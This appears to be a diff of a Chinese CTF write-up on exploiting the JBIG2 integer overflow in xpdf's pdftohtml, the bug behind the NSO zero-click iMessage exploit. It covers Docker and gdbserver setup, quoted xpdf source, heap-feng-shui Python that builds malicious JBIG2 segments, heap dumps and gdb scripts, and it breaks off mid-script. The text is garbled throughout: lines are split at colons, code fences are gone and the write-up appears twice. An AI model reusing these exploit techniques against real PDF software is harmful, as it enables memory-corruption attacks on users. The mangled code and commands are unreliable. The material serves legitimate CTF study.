@@ -18,10 +18,12 @@ Help check how secure our latest PaaS (Pdftohtml-as-a-Service) is!
 Pick your favorite bug from this bloody list, or really, just exploit that bug so your exploit would also work on latest Poppler [1] and maybe even KItinerary.
 The container image is also available on Docker Hub.
 [1] Yeah, turns out propagating bug fixes between different Clone-and-Own codebases takes time :)
-socat -t90 stdio tcp-connect:47.242.147.191:31337
+socat -t90 stdio tcp-connect:47.242.147.191:
+31337
 attachment
 
-Clone-and-Pwn, difficulty:hard
+Clone-and-Pwn, difficulty:
+hard
 
 这题是 clone-and-pwn，源码没有做任何改变，就是通过查看最近提交的漏洞修复记录来发掘并利用漏洞。
 
@@ -37,14 +39,14 @@ cd xpdf-4.03
 mkdir build
 cd build
 cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0" ..
-make -j `nproc` 
+make -j `nproc`
 
 # 题目还给了一个 `GNU C Library (Debian GLIBC 2.33-2) release` 的 glibc 附件
 patchelf --replace-needed libc.so.6 ${PWD}/../../libc.so.6 ./xpdf/pdftohtml
 
 启动方式：
 
-xpdf/pdftohtml <pdf-path> --
+xpdf/pdftohtml  --
 
 2. exploit 调试环境搭建
 
@@ -52,17 +54,18 @@ xpdf/pdftohtml <pdf-path> --
 
 --- a/Dockerfile
 +++ b/Dockerfile
-@@ -8,7 +8,7 @@ RUN cd /tmp/xpdf-4.03 && 
- mkdir build && 
- cd build && 
- cmake -DCMAKE_BUILD_TYPE=Release 
-- -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro" .. && 
-+ -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 " .. && 
+@@ -8,7 +8,7 @@ RUN cd /tmp/xpdf-4.03 &&
+ mkdir build &&
+ cd build &&
+ cmake -DCMAKE_BUILD_TYPE=Release
+- -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro" .. &&
++ -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 " .. &&
  make -j$(nproc)
 
- FROM debian:unstable-20211220-slim
+ FROM debian:
+unstable-20211220-slim
 @@ -20,6 +20,7 @@ RUN echo "deb [check-valid-until=no] http://snapshot.debian.org/archive/debian/2
- apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts && 
+ apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts &&
  apt-get clean && rm -rf /var/lib/apt/lists/*
  COPY --from=build /tmp/xpdf-4.03/build/xpdf/pdftohtml /usr/local/bin/
 +COPY gdbserver /usr/bin/gdbserver
@@ -79,13 +82,14 @@ xpdf/pdftohtml <pdf-path> --
 
 执行 build.sh，执行完成后可以检查一下镜像
 
-➜ chall git:(master) docker image ls 
+➜ chall git:(master) docker image ls
 REPOSITORY TAG IMAGE ID CREATED SIZE
 hsogroupie/pdftohtml latest 042e72a0f133 45 minutes ago 946MB
 
 启动 docker 镜像
 
-docker run -itd -p 1234:1234 -v sakura_volume:/tmp/chall --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --name hsogroupie hsogroupie/pdftohtml
+docker run -itd -p 1234:
+1234 -v sakura_volume:/tmp/chall --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --name hsogroupie hsogroupie/pdftohtml
 
 该命令非常长，解构如下：
 
@@ -94,7 +98,8 @@ docker run --help
 -i : 进入交互模式
 -t : 分配一个伪shell
 -d : 在后台以守护模式运行容器
--p : 宿主机端口:容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了
+-p : 宿主机端口:
+容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了
 -v : 挂载数据卷
 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined : Docker默认禁用PTRACE功能，需要指定这个命令
 --name : 给容器声明一个名字
@@ -121,9 +126,11 @@ docker volume inspect sakura_volume // 查看指定容器卷详情信息
 
 启动完了之后我们可以 docker ps 一下看看有没有问题
 
-➜ chall git:(master) docker ps -a 
+➜ chall git:(master) docker ps -a
 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
-15f265c337c0 hsogroupie/pdftohtml "/bin/sh" 34 minutes ago Up 34 minutes 0.0.0.0:1234->1234/tcp, :::1234->1234/tcp hsogroupie
+15f265c337c0 hsogroupie/pdftohtml "/bin/sh" 34 minutes ago Up 34 minutes 0.0.0.0:
+1234->1234/tcp, :::
+1234->1234/tcp hsogroupie
 
 生成 exp pdf，注意要对 submodule 初始化，不然没有 jbig2enc 库
 
@@ -140,7 +147,8 @@ apt-get install make g++ python3 pybind11-dev python3-dev python2 python2-dev
 make
 ...
 ...
-root@15f265c337c0:/tmp/chall/exploit# make
+root@15f265c337c0:/tmp/chall/exploit
+# make
 g++ -O3 -std=c++20 -shared -fPIC jbig2arith.cc jbig2arith.h jbjbarith.cc jbjbarith.h -ojbjbarith.cpython-39-x86_64-linux-gnu.so -I/usr/include/python3.9 -I/usr/include/python3.9
 python3 sploit.py
 python2 pdf.py sploit > sploit.pdf
@@ -151,13 +159,16 @@ docker exec -it 15f265c337c0 bash
 
 进入容器的 bash 环境，然后启动 gdbserver
 
-rm -rf output && /usr/bin/gdbserver :1234 /usr/local/bin/pdftohtml /tmp/chall/exploit/sploit.pdf output
+rm -rf output && /usr/bin/gdbserver :
+1234 /usr/local/bin/pdftohtml /tmp/chall/exploit/sploit.pdf output
 
 这里的 output 是随便给一个文件夹名就行了，这是 pdftohtml 必须的启动参数，它会创建这个文件夹，并输出一个结果到这个文件夹里，并且它不能是已经存在的文件夹，而 sploit.pdf 就是我们生成出来的 exp pdf 文件。
 
-然后在宿主机也启动 gdb，然后 target remote:1234，然后随便下个断点看看效果，注意因为 docker 里的源码路径和我宿主机的源码路径并不一致，所以要用 substitute-path 做个转换，建议写个 gdb 脚本完成这个事情，后面就不用一直自己敲了。
+然后在宿主机也启动 gdb，然后 target remote:
+1234，然后随便下个断点看看效果，注意因为 docker 里的源码路径和我宿主机的源码路径并不一致，所以要用 substitute-path 做个转换，建议写个 gdb 脚本完成这个事情，后面就不用一直自己敲了。
 
-target remote :1234
+target remote :
+1234
 set substitute-path /tmp/xpdf-4.03/xpdf /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf
 b findSegment
 c
@@ -172,10 +183,11 @@ c
  0x555555675177 je 0x555555675190 <0x555555675190>
 ───────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────
 In file: /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf/JBIG2Stream.cc
- 4036 JBIG2Segment *JBIG2Stream::findSegment(Guint segNum) {
+ 4036 JBIG2Segment *JBIG2Stream::
+findSegment(Guint segNum) {
  4037 JBIG2Segment *seg;
  4038 int i;
- 4039 
+ 4039
  4040 for (i = 0; i < globalSegments->getLength(); ++i) {
  ► 4041 seg = (JBIG2Segment *)globalSegments->get(i);
  4042 if (seg->getSegNum() == segNum) {
@@ -184,18 +196,26 @@ In file: /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf/JBIG2Stream.cc
  4045 }
  4046 for (i = 0; i < segments->getLength(); ++i) {
 ───────────────────────────────────────────[ STACK ]────────────────────────────────────────────
-00:0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov r12, rax
-01:0008│ 0x7fffffffdd30 ◂— 0x0
-02:0010│ 0x7fffffffdd38 ◂— 0x0
-03:0018│ 0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001
-04:0020│ 0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000
-05:0028│ 0x7fffffffdd50 ◂— 0x0
+00:
+0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov r12, rax
+01:
+0008│ 0x7fffffffdd30 ◂— 0x0
+02:
+0010│ 0x7fffffffdd38 ◂— 0x0
+03:
+0018│ 0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001
+04:
+0020│ 0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000
+05:
+0028│ 0x7fffffffdd50 ◂— 0x0
 ... ↓ 2 skipped
 ─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
  ► f 0 0x555555675179
  f 1 0x555555676c72
- f 2 0x555555679198 JBIG2Stream::readSegments()+1032
- f 3 0x555555679473 JBIG2Stream::reset()+211
+ f 2 0x555555679198 JBIG2Stream::
+readSegments()+1032
+ f 3 0x555555679473 JBIG2Stream::
+reset()+211
  f 4 0x55555560139a
  f 5 0x5555556494a9
  f 6 0x55555564aba0
@@ -207,7 +227,8 @@ In file: /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf/JBIG2Stream.cc
 
 这题预期的解法是使用这篇 google project zero 的 iMessage exploit (https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html) 中的漏洞。漏洞点位于 JBIG2Stream：
 
-void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
+void JBIG2Stream::
+readTextRegionSeg(Guint segNum, GBool imm,
  GBool lossless, Guint length,
  Guint *refSegs, Guint nRefSegs) {
  ...
@@ -216,7 +237,7 @@ void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
  // get symbol dictionaries and tables
  codeTables = new GList();
  // 1. 初始时为 0
- numSyms = 0; 
+ numSyms = 0;
  for (i = 0; i < nRefSegs; ++i) {
  if ((seg = findSegment(refSegs[i]))) {
  if (seg->getType() == jbig2SegSymbolDict) {
@@ -304,7 +325,8 @@ pdf 文件中，4 0 obj、5 0 obj 都是表示一个特定的 pdf object。
 
 当 xpdf 对 JBIG2Stream 解码时，正如上节中所示，JBIG2Decode 需要一个参数 JBIG2Globals。因此在解析时，会先解析 JBIG2Globals 的 stream，之后再解析下面的 main stream。以下代码说明了 stream 的解析过程：
 
-void JBIG2Stream::reset()
+void JBIG2Stream::
+reset()
 {
  GList *t;
 
@@ -365,7 +387,8 @@ SymbolDict 主要存放了一个指向 Bitmap 的指针数组。Bitmap 可以用
 
 解析 SymbolDictSeg 时，将会从 stream 中读取并创建出每一个 Bitmap。
 
-GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,
+GBool JBIG2Stream::
+readSymbolDictSeg(Guint segNum, Guint length,
  Guint *refSegs, Guint nRefSegs)
 {
  [...]
@@ -404,7 +427,7 @@ GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,
  else
  {
  arithDecoder->decodeInt(&dh, iadhStats);
- } 
+ }
  [...]
  symHeight += dh;
  symWidth = 0;
@@ -488,7 +511,8 @@ c. PageInfoSeg
 
 对于每个 Page 来说，需要有一个 Bitmap 来表示当前页面渲染的数据。而在解析 PageInfoSeg 时，程序会创建一个流内全局 Bitmap：pageBitmap。
 
-void JBIG2Stream::readPageInfoSeg(Guint length)
+void JBIG2Stream::
+readPageInfoSeg(Guint length)
 {
  Guint xRes, yRes, flags, striping;
 
@@ -521,7 +545,8 @@ GenericRegionSeg 的解析将会从流中读取一个 Bitmap，并与当前的 p
 
 需要注意的是，JBIG2Globals Stream 中的 Segment 不允许引用任何 Segment，因此 GenericRegionSeg 不能存放在 JBIG2Globals 流中。
 
-void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,
+void JBIG2Stream::
+readGenericRegionSeg(Guint segNum, GBool imm,
  GBool lossless, Guint length)
 {
  [...]
@@ -546,7 +571,8 @@ void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,
 
 其中，从流中读取 Bitmap 的操作位于 readGenericBitmap 函数中，读取的操作需要使用到编码器。
 
-而与 pageBitmap 的运算主要是使用 JBIG2Bitmap::combine 方法，该方法中有五种运算方式，分别是 与、或、异或和替换：
+而与 pageBitmap 的运算主要是使用 JBIG2Bitmap::
+combine 方法，该方法中有五种运算方式，分别是 与、或、异或和替换：
 
 switch (combOp)
 {
@@ -573,7 +599,8 @@ e. GenericRefinementRegionSeg
 
 GenericRefinementRegionSeg 的解析过程，组合起来可以对 pageBitmap 上的部分数据进行位运算。我们可以利用这里的位运算来构建加法器：
 
-void JBIG2Stream::readGenericRefinementRegionSeg(Guint segNum, GBool imm,
+void JBIG2Stream::
+readGenericRefinementRegionSeg(Guint segNum, GBool imm,
  GBool lossless, Guint length,
  Guint *refSegs,
  Guint nRefSegs)
@@ -631,7 +658,7 @@ void JBIG2Stream::readGenericRefinementRegionSeg(Guint segNum, GBool imm,
 |
 | .(1)
 |
-V 
+V
 y-axis
 
 从 pageBitmap 上特定位置1取下一块数据，并保存至 segments 上
@@ -648,7 +675,8 @@ ArithEncoder：调用 jbig2enc 对 bitmap 进行编码的类
 
 Bitmap：待被编码的 bitmap 数据
 
-ArithEncoder::Proc：ArithEncoder 编码器的状态枚举
+ArithEncoder::
+Proc：ArithEncoder 编码器的状态枚举
 
 hso-groupie/exploit/jbig2arith.[cc,h]
 
@@ -731,49 +759,37 @@ Help check how secure our latest PaaS (Pdftohtml-as-a-Service) is!
 Pick your favorite bug from this bloody list, or really, just exploit that bug so your exploit would also work on latest Poppler [1] and maybe even KItinerary.
 The container image is also available on Docker Hub.
 [1] Yeah, turns out propagating bug fixes between different Clone-and-Own codebases takes time :)
-socat -t90 stdio tcp-connect:47.242.147.191:31337
+socat -t90 stdio tcp-connect:47.242.147.191:
+31337
 attachment
 
-Clone-and-Pwn, difficulty:hard
-```
-
-
-
-```
+Clone-and-Pwn, difficulty:
+hard
 wget https://dl.xpdfreader.com/xpdf-4.03.tar.gz
 tar -zxvf xpdf-4.03.tar.gz
 cd xpdf-4.03
 mkdir build
 cd build
 cmake -DCMAKE_BUILD_TYPE=Debug -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0" ..
-make -j `nproc` 
+make -j `nproc`
 
 # 题目还给了一个 `GNU C Library (Debian GLIBC 2.33-2) release` 的 glibc 附件
 patchelf --replace-needed libc.so.6 ${PWD}/../../libc.so.6 ./xpdf/pdftohtml
-```
-
-
-
-```
-xpdf/pdftohtml <pdf-path> --
-```
-
-
-
-```
+xpdf/pdftohtml  --
 --- a/Dockerfile
 +++ b/Dockerfile
-@@ -8,7 +8,7 @@ RUN cd /tmp/xpdf-4.03 && 
- mkdir build && 
- cd build && 
- cmake -DCMAKE_BUILD_TYPE=Release 
-- -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro" .. && 
-+ -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 " .. && 
+@@ -8,7 +8,7 @@ RUN cd /tmp/xpdf-4.03 &&
+ mkdir build &&
+ cd build &&
+ cmake -DCMAKE_BUILD_TYPE=Release
+- -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro" .. &&
++ -DCMAKE_CXX_FLAGS="-D_FORTIFY_SOURCE=2 -fstack-protector-strong -Wl,-z,now -Wl,-z,relro -g3 -ggdb3 -O0 " .. &&
  make -j$(nproc)
 
- FROM debian:unstable-20211220-slim
+ FROM debian:
+unstable-20211220-slim
 @@ -20,6 +20,7 @@ RUN echo "deb [check-valid-until=no] http://snapshot.debian.org/archive/debian/2
- apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts && 
+ apt-get install -y fonts-arkpandora fonts-noto fonts-dejavu fonts-font-awesome fonts-lato fonts-powerline gsfonts &&
  apt-get clean && rm -rf /var/lib/apt/lists/*
  COPY --from=build /tmp/xpdf-4.03/build/xpdf/pdftohtml /usr/local/bin/
 +COPY gdbserver /usr/bin/gdbserver
@@ -783,39 +799,21 @@ xpdf/pdftohtml <pdf-path> --
  No newline at end of file
 +ENTRYPOINT [ "/bin/sh"]
  No newline at end of file
-```
-
-
-
-```
-➜ chall git:(master) docker image ls 
+➜ chall git:(master) docker image ls
 REPOSITORY TAG IMAGE ID CREATED SIZE
 hsogroupie/pdftohtml latest 042e72a0f133 45 minutes ago 946MB
-```
-
-
-
-```
-docker run -itd -p 1234:1234 -v sakura_volume:/tmp/chall --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --name hsogroupie hsogroupie/pdftohtml
-```
-
-
-
-```
+docker run -itd -p 1234:
+1234 -v sakura_volume:/tmp/chall --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --name hsogroupie hsogroupie/pdftohtml
 docker run --help
 
 -i : 进入交互模式
 -t : 分配一个伪shell
 -d : 在后台以守护模式运行容器
--p : 宿主机端口:容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了
+-p : 宿主机端口:
+容器端口，将容器端口映射到宿主机端口，这里都指定1234就好了
 -v : 挂载数据卷
 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined : Docker默认禁用PTRACE功能，需要指定这个命令
 --name : 给容器声明一个名字
-```
-
-
-
-```
 docker volume create sakura_volume // 创建一个自定义容器卷
 docker volume ls // 查看所有容器卷
 docker volume inspect sakura_volume // 查看指定容器卷详情信息
@@ -831,56 +829,31 @@ docker volume inspect sakura_volume // 查看指定容器卷详情信息
  "Scope": "local"
  }
 ]
-```
-
-
-
-```
-➜ chall git:(master) docker ps -a 
+➜ chall git:(master) docker ps -a
 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
-15f265c337c0 hsogroupie/pdftohtml "/bin/sh" 34 minutes ago Up 34 minutes 0.0.0.0:1234->1234/tcp, :::1234->1234/tcp hsogroupie
-```
-
-
-
-```
+15f265c337c0 hsogroupie/pdftohtml "/bin/sh" 34 minutes ago Up 34 minutes 0.0.0.0:
+1234->1234/tcp, :::
+1234->1234/tcp hsogroupie
 git clone https://github.com/Riatre/hso-groupie.git
 cd hso-groupie/exploit
 git submodule update --init
 cd ..
 sudo cp -r exploit /var/lib/docker/volumes/sakura_volume/_data
-```
-
-
-
-```
 apt-get update
 apt-get install make g++ python3 pybind11-dev python3-dev python2 python2-dev
 make
 ...
 ...
-root@15f265c337c0:/tmp/chall/exploit# make
+root@15f265c337c0:/tmp/chall/exploit
+# make
 g++ -O3 -std=c++20 -shared -fPIC jbig2arith.cc jbig2arith.h jbjbarith.cc jbjbarith.h -ojbjbarith.cpython-39-x86_64-linux-gnu.so -I/usr/include/python3.9 -I/usr/include/python3.9
 python3 sploit.py
 python2 pdf.py sploit > sploit.pdf
-```
-
-
-
-```
 docker exec -it 15f265c337c0 bash
-```
-
-
-
-```
-rm -rf output && /usr/bin/gdbserver :1234 /usr/local/bin/pdftohtml /tmp/chall/exploit/sploit.pdf output
-```
-
-
-
-```
-target remote :1234
+rm -rf output && /usr/bin/gdbserver :
+1234 /usr/local/bin/pdftohtml /tmp/chall/exploit/sploit.pdf output
+target remote :
+1234
 set substitute-path /tmp/xpdf-4.03/xpdf /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf
 b findSegment
 c
@@ -895,10 +868,11 @@ c
  0x555555675177 je 0x555555675190 <0x555555675190>
 ───────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────
 In file: /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf/JBIG2Stream.cc
- 4036 JBIG2Segment *JBIG2Stream::findSegment(Guint segNum) {
+ 4036 JBIG2Segment *JBIG2Stream::
+findSegment(Guint segNum) {
  4037 JBIG2Segment *seg;
  4038 int i;
- 4039 
+ 4039
  4040 for (i = 0; i < globalSegments->getLength(); ++i) {
  ► 4041 seg = (JBIG2Segment *)globalSegments->get(i);
  4042 if (seg->getSegNum() == segNum) {
@@ -907,28 +881,32 @@ In file: /home/sakura/ctf/hso-groupie/chall/xpdf-4.03/xpdf/JBIG2Stream.cc
  4045 }
  4046 for (i = 0; i < segments->getLength(); ++i) {
 ───────────────────────────────────────────[ STACK ]────────────────────────────────────────────
-00:0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov r12, rax
-01:0008│ 0x7fffffffdd30 ◂— 0x0
-02:0010│ 0x7fffffffdd38 ◂— 0x0
-03:0018│ 0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001
-04:0020│ 0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000
-05:0028│ 0x7fffffffdd50 ◂— 0x0
+00:
+0000│ rsp 0x7fffffffdd28 —▸ 0x555555676c72 ◂— mov r12, rax
+01:
+0008│ 0x7fffffffdd30 ◂— 0x0
+02:
+0010│ 0x7fffffffdd38 ◂— 0x0
+03:
+0018│ 0x7fffffffdd40 —▸ 0x555561ec0f00 ◂— 0x200000001
+04:
+0020│ 0x7fffffffdd48 —▸ 0x555561f40c64 ◂— 0x203a100000000
+05:
+0028│ 0x7fffffffdd50 ◂— 0x0
 ... ↓ 2 skipped
 ─────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────
  ► f 0 0x555555675179
  f 1 0x555555676c72
- f 2 0x555555679198 JBIG2Stream::readSegments()+1032
- f 3 0x555555679473 JBIG2Stream::reset()+211
+ f 2 0x555555679198 JBIG2Stream::
+readSegments()+1032
+ f 3 0x555555679473 JBIG2Stream::
+reset()+211
  f 4 0x55555560139a
  f 5 0x5555556494a9
  f 6 0x55555564aba0
  f 7 0x55555563c9e5
-```
-
-
-
-```
-void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
+void JBIG2Stream::
+readTextRegionSeg(Guint segNum, GBool imm,
  GBool lossless, Guint length,
  Guint *refSegs, Guint nRefSegs) {
  ...
@@ -937,7 +915,7 @@ void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
  // get symbol dictionaries and tables
  codeTables = new GList();
  // 1. 初始时为 0
- numSyms = 0; 
+ numSyms = 0;
  for (i = 0; i < nRefSegs; ++i) {
  if ((seg = findSegment(refSegs[i]))) {
  if (seg->getType() == jbig2SegSymbolDict) {
@@ -968,11 +946,6 @@ void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
  }
  ...
 }
-```
-
-
-
-```
 4 0 obj
 << /Filter /FlateDecode
 /Length 3988
@@ -997,12 +970,8 @@ stream
 /* [MyStream2] */
 endstream
 endobj
-```
-
-
-
-```
-void JBIG2Stream::reset()
+void JBIG2Stream::
+reset()
 {
  GList *t;
 
@@ -1048,12 +1017,8 @@ void JBIG2Stream::reset()
  dataPtr = dataEnd = NULL;
  }
 }
-```
-
-
-
-```
-GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,
+GBool JBIG2Stream::
+readSymbolDictSeg(Guint segNum, Guint length,
  Guint *refSegs, Guint nRefSegs)
 {
  [...]
@@ -1092,7 +1057,7 @@ GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,
  else
  {
  arithDecoder->decodeInt(&dh, iadhStats);
- } 
+ }
  [...]
  symHeight += dh;
  symWidth = 0;
@@ -1171,12 +1136,8 @@ GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,
  segments->append(symbolDict);
  [...]
 }
-```
-
-
-
-```
-void JBIG2Stream::readPageInfoSeg(Guint length)
+void JBIG2Stream::
+readPageInfoSeg(Guint length)
 {
  Guint xRes, yRes, flags, striping;
 
@@ -1198,12 +1159,8 @@ void JBIG2Stream::readPageInfoSeg(Guint length)
 eofError:
  error(errSyntaxError, getPos(), "Unexpected EOF in JBIG2 stream");
 }
-```
-
-
-
-```
-void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,
+void JBIG2Stream::
+readGenericRegionSeg(Guint segNum, GBool imm,
  GBool lossless, Guint length)
 {
  [...]
@@ -1225,11 +1182,6 @@ void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,
  }
  [...]
 }
-```
-
-
-
-```
 switch (combOp)
 {
  case 0: // or
@@ -1248,12 +1200,8 @@ switch (combOp)
  dest = (src1 & m2) | (dest & m1);
  break;
 }
-```
-
-
-
-```
-void JBIG2Stream::readGenericRefinementRegionSeg(Guint segNum, GBool imm,
+void JBIG2Stream::
+readGenericRefinementRegionSeg(Guint segNum, GBool imm,
  GBool lossless, Guint length,
  Guint *refSegs,
  Guint nRefSegs)
@@ -1294,25 +1242,16 @@ void JBIG2Stream::readGenericRefinementRegionSeg(Guint segNum, GBool imm,
  }
  [...]
 }
-```
-
-
-
-```
 +----------------------> x-axis
 |
 | .(2)
 |
 | .(1)
 |
-V 
+V
 y-axis
-```
-
-
-
-```
-void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
+void JBIG2Stream::
+readTextRegionSeg(Guint segNum, GBool imm,
  GBool lossless, Guint length,
  Guint *refSegs, Guint nRefSegs)
 {
@@ -1367,34 +1306,15 @@ void JBIG2Stream::readTextRegionSeg(Guint segNum, GBool imm,
  }
  [...]
 }
-```
-
-
-
-```
-git clone git@github.com:agl/jbig2enc.git
-```
-
-
-
-```
+git clone git@github.com:
+agl/jbig2enc.git
 sudo apt-get install pybind11-dev
-```
-
-
-
-```
 # global segment
 global_file = [
  SymbolDict(0, [Bitmap(1, 1)] * 0x10000),
  SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow // 8)),
  SymbolDict(2, [Bitmap(1, 1)]),
 ]
-```
-
-
-
-```
 pwndbg> bins
 tcachebins
 0x20 [ 4]: 0x55555579f8e0 —▸ 0x5555557b9550 —▸ 0x5555557b0c10 —▸ 0x5555557b0c60 ◂— 0x0
@@ -1516,11 +1436,6 @@ largebins
 0x2600: 0x5555557b6aa0 —▸ 0x5555557c1110 —▸ 0x7ffff7ad92d0 (main_arena+1840) ◂— 0x5555557b6aa0
 0x2a00: 0x55555579af20 —▸ 0x7ffff7ad92f0 (main_arena+1872) ◂— 0x55555579af20
 0x3000: 0x5555557d3d80 —▸ 0x5555557d9b60 —▸ 0x5555557c88a0 —▸ 0x7ffff7ad9300 (main_arena+1888) ◂— 0x5555557d3d80
-```
-
-
-
-```
 def DummyAlloc(size):
  return PageInfo(233, w=8, h=size)
 
@@ -1532,11 +1447,6 @@ global_file = [
  [[DummyAlloc(size)] * 128 for size in range(0x10, 0x1000, 0x10)],
  [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],
 ]
-```
-
-
-
-```
 pwndbg> bins
 tcachebins
 empty
@@ -1556,34 +1466,27 @@ FD: 0x55555579d9f0 —▸ 0x5555557d2860 —▸ 0x555555798db0 —▸ 0x5555557d
 BK: 0x5555557f96e0 —▸ 0x5555557f9300 —▸ 0x5555557fb200 —▸ 0x5555557fdf40 —▸ 0x5555557fd390 ◂— ...
 largebins
 empty
-```
-
-
-
-```
-GList::GList() {
+GList::
+GList() {
  size = 8;
  data = (void **)gmallocn(size, sizeof(void*));
  length = 0;
  inc = 0;
 }
 
-void GList::append(void *p) {
+void GList::
+append(void *p) {
  if (length >= size) {
  expand();
  }
  data[length++] = p;
 }
 
-void GList::expand() {
+void GList::
+expand() {
  size += (inc > 0) ? inc : size;
  data = (void **)greallocn(data, size, sizeof(void*));
 }
-```
-
-
-
-```
 global_file = [
  SymbolDict(0, [Bitmap(1, 1)] * 0x10000),
  SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow // 8)),
@@ -1593,21 +1496,18 @@ global_file = [
  [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],
  # ------------ 开始尝试堆风水 ------------
  [SymbolDict(i, []) for i in range(3, glist_capacity // 2)],
- # Now most bins are empty, except tcachebin 0x20, 0x50 and small bin 0x20
- # This triggers GList::expand(), 0x80 -> 0x100; allocates from top chunk
+ # Now most bins are empty, 
+except tcachebin 0x20, 0x50 and small bin 0x20
+ # This triggers GList::
+expand(), 0x80 -> 0x100; allocates from top chunk
  SymbolDict(glist_capacity // 2, []),
  [SymbolDict(i, []) for i in range(glist_capacity // 2 + 1, glist_capacity)],
  # 0x100 -> 0x200, the old chunk should fall in tcache
  SymbolDict(100, []),
 ]
-```
-
-
-
-```
 // low address --------------------------------------------
-/* 
- 一些其他的堆块分配，包括 
+/*
+ 一些其他的堆块分配，包括
  1. size=8 的 global GList backing store
  2. DummyAlloc
  3. SymbolDict0、1、2
@@ -1620,11 +1520,6 @@ size=32 的 global GList backing store 堆空洞
 SymbolDict17-32;
 size=64 的 global GList backing store // 最终的 GList data 堆位置，这里可不是堆空洞
 // high address -------------------------------------------
-```
-
-
-
-```
 file ../../xpdf-4.03/build/xpdf/pdftohtml
 aslr off
 set follow-fork-mode parent
@@ -1660,8 +1555,9 @@ commands
  p *(GList *)segments
  # tcachebins
  bins
- 
- tb JBIG2Stream.cc:1481
+
+ tb JBIG2Stream.cc:
+1481
  commands
  printf "after finish globalSegments addr is:0x%llxn", segments
  p *(GList *)segments
@@ -1672,7 +1568,8 @@ commands
  # c
 end
 
-b JBIG2Stream.cc:2072 if segNum==102
+b JBIG2Stream.cc:
+2072 if segNum==102
 commands
  printf "sakura in TextRegion to trigger oobn"
  printf "numSyms after underoverflow is:0x%llxn", numSyms
@@ -1690,25 +1587,15 @@ commands
 end
 
 r sploit.pdf output
-```
-
-
-
-```
 page0 = [
  # Make sure page bitmap buffer uses the second-last globalSegments data buffer so
  # that it lies just before syms, at a fixed offset.
  # GLIST_DATA_SIZE // 4，表示占据 size=16 时的 glist 堆空洞
